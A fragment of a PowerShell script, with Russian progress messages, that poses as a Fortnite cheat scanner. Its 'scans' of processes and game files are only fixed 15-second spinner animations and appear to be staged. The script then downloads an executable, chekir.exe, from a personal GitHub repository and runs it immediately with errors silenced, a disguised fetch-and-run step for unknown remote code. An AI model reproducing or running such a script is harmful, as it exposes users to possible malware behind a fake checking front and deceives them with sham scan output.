...
# === 1. ПРОЦЕССЫ (15 сек) ===
Write-Host "`n[1/6] 🔍 Сканирование процессов fortnite.exe..." -ForegroundColor Cyan
Show-Spinner "Анализ DLL и инжекторов..." 15

# === 2. .FORTNITE (15 сек) ===
Write-Host "`n[2/6] 📁 Сканирование .fortnite..." -ForegroundColor Cyan
Show-Spinner "Проверка ресурсов, jars, json..." 15
...
try {
    ...
    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe -ErrorAction SilentlyContinue
